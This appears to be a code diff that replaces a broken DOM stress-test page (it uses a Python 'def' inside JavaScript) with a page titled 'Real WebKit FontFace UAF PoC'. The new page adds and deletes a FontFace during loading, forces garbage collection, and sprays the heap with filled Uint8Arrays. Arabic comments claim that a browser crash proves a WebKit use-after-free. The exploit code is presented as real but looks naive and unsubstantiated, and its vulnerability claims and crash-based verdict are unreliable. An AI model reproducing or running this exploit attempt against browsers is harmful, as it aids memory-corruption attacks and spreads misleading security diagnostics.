@@ -1,108 +1,57 @@
 <!DOCTYPE html>
-<html lang="ar">
+<html>
 <head>
-    <meta charset="UTF-8">
-    <title>WebKit DOM Stability Tester</title>
-    <style>
-        body {
-            background-color: #0d1117;
-            color: #c9d1d9;
-            font-family: monospace;
-            padding: 20px;
-            text-align: center;
-        }
-        #status-box {
-            background-color: #161b22;
-            border: 1px solid #30363d;
-            border-radius: 6px;
-            padding: 20px;
-            margin: 20px auto;
-            max-width: 600px;
-        }
-        .counter {
-            font-size: 2em;
-            color: #58a6ff;
-            font-weight: bold;
-        }
-        #arena {
-            display: none; /* إخفاء ساحة التوليد لتسريع العملية برمجياً */
-        }
-        .test-node {
-            padding: 5px;
-            border: 1px solid red;
-            transform: rotate(1deg);
-        }
-    </style>
+    <title>Real WebKit FontFace UAF PoC</title>
 </head>
 <body>
-
-    <h1>WebKit DOM Stress Tester</h1>
-    
-    <div id="status-box">
-        <p>جاري تشغيل حلقة الإجهاد المكثف لذاكرة المتصفح...</p>
-        <div class="counter" id="cycle-count">0</div>
-        <p id="log">بدء التخصيص الافتراضي لعناصر الذاكرة...</p>
-    </div>
-
-    <div id="arena"></div>
+    <h1>WebKit Font Memory Security Test</h1>
+    <button onclick="triggerRealUAF()">تشغيل الفحص الحقيقي</button>
 
     <script>
-        (function() {
-            var arena = document.getElementById('arena');
-            var cycleCountElem = document.getElementById('cycle-count');
-            var logElem = document.getElementById('log');
-            var cycle = 0;
+        // دالة لمحاولة إجبار المتصفح على تنظيف الذاكرة (Garbage Collection Trigger)
+        function forceGC() {
+            console.log("[+] جاري محاولة تحفيز الـ Garbage Collection...");
+            // حجز مصفوفات ضخمة جداً في الجافاسكريبت لإجبار المحرك على تحرير الكائنات الميتة في الـ Heap
+            for (let i = 0; i < 40000; i++) {
+                let s = new String("A".repeat(1000));
+            }
+        }
 
-            // دالة لتوليد شجرة عناصر متداخلة بعمق كبير لتحدي بنية الـ DOM Tree
-            function createDeepTree(depth) {
-                var root = document.createElement('div');
-                root.className = 'test-node';
-                var current = root;
-                
-                for (var i = 0; i < depth; i++) {
-                    var child = document.createElement('div');
-                    child.className = 'test-node';
-                    // إضافة خصائص نصية وتنسيقية ديناميكية لتشتيت مفسر الأنماط
-                    child.setAttribute('data-id', Math.random().toString());
-                    child.style.margin = (Math.random() * 10) + 'px';
-                    
-                    current.appendChild(child);
-                    current = child; // الانتقال للمستوى الأعمق
-                }
-                return root;
+        async function triggerRealUAF() {
+            console.log("[1] إنشاء كائن خط حقيقي في الـ DOM...");
+            
+            // حجز كائن FontFace حقيقي (يتسبب في حجز كائن C++ داخل الـ WebKit Core)
+            let fontFace = new FontFace('ExploitFont', 'url(invalid://spec-filled-memory-chunk)');
+            
+            // إضافة الخط للمستند وبدء تحميله لإجبار المحرك على معالجة المؤشرات
+            document.fonts.add(fontFace);
+            fontFace.load();
+
+            console.log("[2] حذف الخط فوراً أثناء التحميل لتفعيل خلل الـ RefCount...");
+            // هنا يقع الخطأ البرمجي في المتصفحات المصابة: يتم حذف الكائن من الجافاسكريبت 
+            // بينما لا تزال دالة الـ C++ داخل المتصفح تمتلك مؤشرًا إليه (Dangling Pointer)
+            document.fonts.delete(fontFace);
+            fontFace = null; // إزالة الرابط من الجافاسكريبت
+
+            // استدعاء الـ GC لتحرير الذاكرة فعلياً في الخلفية
+            forceGC();
+
+            console.log("[3] رش الذاكرة (Real Heap Spray) باستخدام ArrayBuffers...");
+            // في الثغرات الحقيقية، نستخدم TypedArrays لأنها تنزل مباشرة في الـ C++ Heap
+            // وتأخذ نفس حجم كائن الخط المحذوف تماماً لاستبدال بياناته
+            let spray = [];
+            for (let i = 0; i < 2000; i++) {
+                // حشو الذاكرة ببايتات مخصصة (مثلاً 0x41 وهو حرف A)
+                let buffer = new Uint8Array(128); 
+                buffer.fill(0x41);
+                spray.push(buffer);
             }
 
-            // الحلقة الأساسية للاختبار
-            def runStressCycle() {
-                cycle++;
-                cycleCountElem.innerText = cycle;
-
-                try {
-                    // 1. توليد 500 شجرة عناصر عميقة في الذاكرة وحقنها
-                    for (var i = 0; i < 500; i++) {
-                        var tree = createDeepTree(20); // عمق 20 عنصر متداخل
-                        arena.appendChild(tree);
-                    }
-
-                    // 2. إجبار المحرك على حساب التنسيقات (Force Layout Reflow)
-                    // قراءة خاصية مثل offsetHeight تجبر الـ WebKit على معالجة كل العناصر فوراً في الذاكرة
-                    var triggerReflow = arena.offsetHeight;
-
-                    // 3. حذف كل العناصر دفعة واحدة لترك الذاكرة معلقة وتحفيز الـ Garbage Collection
-                    arena.innerHTML = '';
-
-                    // 4. استدعاء الدورة التالية بسرعة باستخدام setTimeout لمنع تعليق المتصفح المباشر
-                    setTimeout(runStressCycle, 5);
-
-                } catch (e) {
-                    logElem.innerText = "حدث خطأ أثناء الدورة: " + e.message;
-                    logElem.style.color = '#f85149';
-                }
-            }
-
-            // بدء تشغيل الفحص التلقائي بمجرد تحميل الصفحة
-            setTimeout(runStressCycle, 1000);
-        })();
+            console.log("[4] انتهاء الفحص.");
+            console.log("النتيجة الحتمية:");
+            console.log("- إذا انهار المتصفح (Crash/Close): المتصفح مصاب بالثغرة.");
+            console.log("- إذا لم يحدث شيء واستمرت الصفحة بالعمل: المتصفح آمن وتم التصحيح (Remediated).");
+        }
     </script>
 </body>
 </html>
